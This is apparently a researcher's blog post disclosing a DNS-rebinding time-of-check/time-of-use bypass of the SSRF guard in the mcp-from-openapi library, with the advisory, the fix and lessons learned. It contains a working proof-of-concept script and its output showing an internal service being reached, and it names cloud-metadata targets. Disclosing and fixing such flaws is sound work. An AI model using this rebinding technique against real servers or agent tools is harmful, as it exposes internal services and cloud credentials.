---
title: "The DNS check that passed and the connection that didn't care"
description: "mcp-from-openapi added an SSRF guard to protect internal services and cloud metadata. It resolved the hostname once to validate it, and then called fetch(), which re-resolved it at connection time. How a classic DNS TOCTOU slips into modern async JavaScript, why blocklist hardening can't fix it, and what it actually takes to pin a socket."
date: "2026-09-26"
tags: ["security", "ssrf", "dns-rebinding", "mcp", "nodejs", "vulnerability"]
---

I've been spending some time looking at the Model Context Protocol (MCP) ecosystem lately. It's an exciting space because it's giving LLMs arms and legs: instead of just generating text, an agent can read an OpenAPI schema, generate client tools dynamically, and start talking to APIs.

Naturally, whenever you give an autonomous agent the ability to fetch remote URLs on behalf of users, you immediately run headfirst into a classic security dilemma: Server-Side Request Forgery (SSRF). If someone points your agent at `http://internal-payroll.corp/` or `http://169.254.169.254/latest/meta-data/`, you don't want the server happily making that request and feeding internal AWS credentials or internal state back into the model's context window.

The library `mcp-from-openapi` (a package for turning OpenAPI specs into MCP tools) recognized this and added an explicit SSRF guard in version 2.5.0 (`assertUrlSafe`). It had a comprehensive IP blocklist covering loopback, private RFC1918 subnets, link-local metadata addresses, IPv6 mappings, everything.

And yet, it was completely bypassable.

I reported this in [GHSA-rm2m-wfw5-7wp5](https://github.com/agentfront/mcp-from-openapi/security/advisories/GHSA-rm2m-wfw5-7wp5). The maintainer, David at Frontegg, was great to work with, confirmed the bug within hours, and shipped a proper architectural fix in version 2.5.1 (and subsequent releases up to 2.8.0).

I wanted to write this up because the flaw here is not a silly typo or a missing regex. It's a textbook, beautiful example of a **Time-of-Check to Time-of-Use (TOCTOU)** bug sitting right at the boundary between application logic and the operating system's networking stack. It illustrates a trap that many developers fall into when trying to secure network requests.

Let's unpack how it worked, why standard blocklists couldn't save it, and how to actually pin an HTTP client.

## The Mental Model: "Check then Fetch"

To understand what went wrong, let's look at how people intuitively think about securing an outbound HTTP request. The mental model looks like this:

1. Look at the target URL: `http://attacker.com/openapi.json`.
2. Extract the hostname (`attacker.com`).
3. Resolve the hostname to an IP address using DNS.
4. Check if that IP is in our "forbidden" list (private IPs, loopback, AWS metadata).
5. If it's safe, go ahead and call `fetch(url)`.

It feels totally natural, clean, and logical. You wrote a nice little validator function, you checked your inputs, and you handed off the request to your favorite HTTP client.

Here is what the code in `mcp-from-openapi` was essentially doing under the hood (simplified from `src/ssrf.ts`):

```typescript
async function assertUrlSafe(url: string) {
  const parsed = new URL(url);
  // 1. Resolve hostname to an IP address
  const addresses = await dns.promises.lookup(parsed.hostname, { all: true });
  
  // 2. Run every IP against a strict blocklist
  for (const { address } of addresses) {
    if (isBlockedAddress(address)) {
      throw new Error("Access to blocked IP address: " + address);
    }
  }
  // All good! Return without error.
}

async function safeFetch(url: string, options: any) {
  // Step 1: Check
  await assertUrlSafe(url);

  // Step 2: Use
  return await fetch(url, options);
}
```

Notice what happens to `addresses` inside `assertUrlSafe()`. It checks them, determines they are safe, and then... *throws them away*.

Then, on the very next line, `safeFetch` calls `fetch(url)`.

And what does `fetch()` do? Under the hood in modern Node.js, `fetch` (powered by Undici) is handed an unadorned URL string containing `attacker.com`. It doesn't know anything about the IP address `assertUrlSafe` just checked. It has to open a TCP socket, so it calls the system resolver and performs **a second, independent DNS lookup** right as it opens the connection.

And that gap between check and use is where the entire abstraction leaks.


## DNS Rebinding: The Exploit

If you control the authoritative DNS server for a domain name, you don't have to return static answers. DNS answers carry a TTL (Time To Live), and your nameserver can return whatever IP it feels like on any given millisecond.

So an attacker sets up a domain, say `rebind.attacker.test`, configured with a TTL of 0:

- **Query 1 (Check time):** Your server's `assertUrlSafe` asks "What is `rebind.attacker.test`?" The attacker's DNS server responds: `8.8.8.8` (a perfectly safe, public Google IP). The validator checks `8.8.8.8`, says "Looks great!", and exits cleanly.
- **Query 2 (Connection time):** Milliseconds later, `fetch()` asks "What is `rebind.attacker.test`?" The attacker's DNS server responds: `127.0.0.1` (or `169.254.169.254`). Undici opens a TCP socket to `127.0.0.1:8124`, sends the HTTP request, and reads the response.

Here is a minimal reproduction script using Node's standard modules to model this exact race condition:

```javascript
import http from "node:http";
import net from "node:net";
import dns from "node:dns";
import { createRequire } from "node:module";

const { safeFetch } = createRequire(import.meta.url)("mcp-from-openapi");

const HOST = "rebind.attacker.test";
const PORT = 8124;

// Spin up an internal "victim" HTTP service on localhost
const internalServer = http.createServer((req, res) => {
  res.setHeader("content-type", "application/json");
  res.end(JSON.stringify({ secret: "SUPER-SENSITIVE-INTERNAL-STATE" }));
});
await new Promise((resolve) => internalServer.listen(PORT, "127.0.0.1", resolve));

// Simulate authoritative DNS answering with two different IPs
let queryCount = 0;
dns.promises.lookup = async (hostname, options) => {
  queryCount++;
  // First lookup (check): public IP. Second lookup (connection): internal loopback.
  const answer = queryCount === 1 ? "8.8.8.8" : "127.0.0.1";
  return options?.all ? [{ address: answer, family: 4 }] : { address: answer, family: 4 };
};

// Also ensure the socket dialer redirects to loopback if net.connect is invoked
const origConnect = net.connect;
net.connect = function (opts, ...rest) {
  if (opts && opts.host === HOST) {
    return origConnect.call(this, { ...opts, host: "127.0.0.1" }, ...rest);
  }
  return origConnect.call(this, opts, ...rest);
};

// Now test safeFetch
console.log("[*] Calling safeFetch against rebind target...");
const res = await safeFetch("http://" + HOST + ":" + PORT + "/openapi.json", {
  ssrf: { allowedHosts: [], blockedHosts: [] },
  followRedirects: false,
});

const body = await res.text();
if (body.includes("SUPER-SENSITIVE-INTERNAL-STATE")) {
  console.log("[!] VULNERABILITY CONFIRMED: SSRF guard bypassed!");
  console.log("    Response body:", body);
} else {
  console.log("[+] Blocked or safe.");
}

internalServer.close();
```

When you run this against `mcp-from-openapi` (version 2.5.0 or earlier):

```text
[*] Calling safeFetch against rebind target...
[!] VULNERABILITY CONFIRMED: SSRF guard bypassed!
    Response body: {"secret":"SUPER-SENSITIVE-INTERNAL-STATE"}
```

The guard was completely powerless. You could make the IP blocklist a million lines long; you could check every CIDR block known to mankind. It doesn't matter, because the check was performed on an answer that was never dialed, and the answer that *was* dialed was never checked.


## Why Blocklists Are the Wrong Layer

Whenever people see an SSRF bypass, the immediate instinct is often: "Oh, did they forget an IP range? Did they forget IPv6-mapped IPv4? Did they forget octal notation like `0177.0.0.1`?"

And libraries will spend dozens of commits playing cat-and-mouse, adding regexes to parse IP addresses in every conceivable encoding. 

`mcp-from-openapi` actually did a great job on its blocklist! It checked:
- Loopback (`127.0.0.0/8`, `::1`)
- RFC 1918 private subnets (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)
- Carrier-grade NAT (`100.64.0.0/10`)
- Link-local and cloud metadata (`169.254.0.0/16`, `fe80::/10`)
- IPv6 Unique Local (`fc00::/7`), Multicast (`ff00::/8`)
- Dotted and hex IPv4-mapped IPv6 representations

The problem wasn't what was on the list. The problem was **architectural**. 

In systems programming, whenever you separate validation from execution over a shared, mutable namespace (whether that's filesystem paths, shared memory, or DNS records), you create a TOCTOU. If you check the file with `access()` before calling `open()`, someone can swap a symlink under your feet. If you check a domain name before dialing it, the DNS server can swap the A record under your feet.

You cannot secure a network request by checking a hostname upfront and letting a black-box HTTP client resolve it later. You have to **pin the resolution to the socket**.

## The Fix: Pinning the Dial

So how do you actually fix this in Node.js?

You have to ensure that **the exact IP address you validated is the exact IP address the TCP socket connects to.**

There are two primary ways to do this:

### Approach A: The Custom Lookup Hook (The 2.5.1 Fix)
Instead of using vanilla global `fetch()`, configure the HTTP transport (using `node:http` or an agent) with a custom `lookup` function. 

1. When a connection is initiated, your custom `lookup` receives the hostname.
2. It resolves the hostname via DNS.
3. It validates the resolved IP addresses against the blocklist *inside* the lookup hook.
4. If valid, it returns the IP address directly to the socket dialer.
5. Crucially, the HTTP client still sends `Host: attacker.com` in the HTTP headers and uses `attacker.com` for TLS Server Name Indication (SNI), so virtual hosting and HTTPS certs don't break.

In `mcp-from-openapi` 2.5.1, David replaced the unpinned `fetch` on Node with a dedicated `node:http`/`node:https` transport that injects this exact shared lookup per hop (including following redirects).

### Approach B: Socket-Level Validation
Another clean pattern, if you have access to the raw socket creation, is to attach a listener to the `'connect'` or `'lookup'` event on the `net.Socket`:

```typescript
const socket = net.connect({ host: ipAddress, port: port });
socket.on('connect', () => {
  const remoteIp = socket.remoteAddress;
  if (isBlockedAddress(remoteIp)) {
    socket.destroy(new Error("SSRF blocked at connect time"));
  }
});
```
Before a single byte of HTTP request plaintext leaves your machine, you verify `socket.remoteAddress`. If the operating system actually connected to a forbidden IP, you immediately tear down the socket.

### A Subtle Trap: Socket Pooling (Keep-Alive)

While validating the fix, the maintainers ran into an even subtler edge case: **HTTP Keep-Alive agent socket pooling**.

In Node.js >= 19, `http.globalAgent` pools active sockets by `host:port` to reuse them for subsequent requests. If client A and client B both request `rebind.attacker.test:80`, Node might reuse an already-open socket from the pool without ever invoking the custom `lookup` function a second time! 

If an attacker could get a legitimate connection pooled, they might trick a subsequent request into riding the pooled connection. To completely eliminate this vector, PR #37 hardened the transport to ensure SSRF-protected requests always allocate a fresh, unpooled socket.

## Takeaways

A few general lessons worth keeping in your back pocket:

- **DNS is hostile, stateful, and asynchronous.** Never assume a domain name resolves to a static value across two calls. If you resolve it twice, you're asking for two different answers.
- **Validate at the point of action.** If your security check doesn't directly dictate the bytes or the socket connection, you're building on quicksand.
- **Be careful with high-level abstractions in security boundaries.** High-level functions like `fetch('http://...')` are designed for developer convenience, not adversarial security guarantees. They hide DNS resolution, connection pooling, redirection, and socket lifecycle behind a clean API. When you need guarantees about *where* a packet travels, you have to peer under the abstraction.

Huge props to David and the team at `mcp-from-openapi` for taking the report seriously, validating it immediately, and shipping a proper architectural fix. The advisory is published under [GHSA-rm2m-wfw5-7wp5](https://github.com/agentfront/mcp-from-openapi/security/advisories/GHSA-rm2m-wfw5-7wp5), and if you use the library, make sure to upgrade to `>= 2.5.1` (or `>= 2.8.0`).

Good luck out there, and happy hacking!

